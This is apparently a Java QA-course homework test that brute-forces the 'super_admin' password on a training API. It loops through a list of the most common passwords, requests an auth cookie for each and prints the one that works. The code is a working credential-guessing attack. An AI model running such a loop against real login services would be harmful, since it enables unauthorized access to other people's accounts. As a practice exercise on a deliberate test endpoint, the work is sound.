import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class GetSecretPasswordTest {

    String[] getPasswords(){
        String s = """
password	password	123456	123456	123456	123456	123456	123456	123456
123456	123456	password	password	password	password	password	password	123456789
12345678	12345678	12345678	12345	12345678	12345	12345678	123456789	qwerty
qwerty	abc123	qwerty	12345678	qwerty	12345678	qwerty	12345678	password
abc123	qwerty	abc123	qwerty	12345	football	12345	12345	1234567
monkey	monkey	123456789	123456789	123456789	qwerty	123456789	111111	12345678
1234567	letmein	111111	1234	football	1234567890	letmein	1234567	12345
letmein	dragon	1234567	baseball	1234	1234567	1234567	sunshine	iloveyou
trustno1	111111	iloveyou	dragon	1234567	princess	football	qwerty	111111
dragon	baseball	adobe123[a]	football	baseball	1234	iloveyou	iloveyou	123123
baseball	iloveyou	123123	1234567	welcome	login	admin	princess	abc123
111111	trustno1	admin	monkey	1234567890	welcome	welcome	admin	qwerty123
iloveyou	1234567	1234567890	letmein	abc123	solo	monkey	welcome	1q2w3e4r
master	sunshine	letmein	abc123	111111	abc123	login	666666	admin
sunshine	master	photoshop[a]	111111	1qaz2wsx	admin	abc123	abc123	qwertyuiop
ashley	123123	1234	mustang	dragon	121212	starwars	football	654321
bailey	welcome	monkey	access	master	flower	123123	123123	555555
passw0rd	shadow	shadow	shadow	monkey	passw0rd	dragon	monkey	lovely
shadow	ashley	sunshine	master	letmein	dragon	passw0rd	654321	7777777
123123	football	12345	michael	login	sunshine	master	!@#$%^&*	welcome
654321	jesus	password1	superman	princess	master	hello	charlie	888888
superman	michael	princess	696969	qwertyuiop	hottie	freedom	aa123456	princess
qazwsx	ninja	azerty	123123	solo	loveme	whatever	donald	dragon
michael	mustang	trustno1	batman	passw0rd	zaq1zaq1	qazwsx	password1	password1
Football	password1	000000	trustno1	starwars	password1	trustno1	qwerty123	123qwe""";
        String[] passwords = s.split("[\\s\\t\\r\\n]+");
        return Arrays.stream(passwords).distinct().toArray(String[]::new);
    }

    String requestCookie(String login, String password) {
        Map<String,String> params = new HashMap<>();
        params.put("login", login);
        params.put("password", password);
        Response response = RestAssured
                .given()
                .queryParams(params)
                .when()
                .get("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                .andReturn();
        return response.getCookie("auth_cookie");
    }

    String checkAuthCookie(String cookie) {
        Response response = RestAssured
                .given()
                .cookie("auth_cookie", cookie)
                .when()
                .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .andReturn();
        return response.getBody().asString();
    }

    @Test
    public void mostCommonPasswordsTest() throws InterruptedException {
        String[] passwords = getPasswords();
        String login = "super_admin";
        for (String password: passwords) {
            String cookie = requestCookie(login, password);
            String answer = checkAuthCookie(cookie);
            if (!answer.equals("You are NOT authorized")) {
                System.out.printf("Ответ: %s \n", answer);
                System.out.printf("Правильный пароль: %s \n", password);
                break;
            }
        }
    }
}
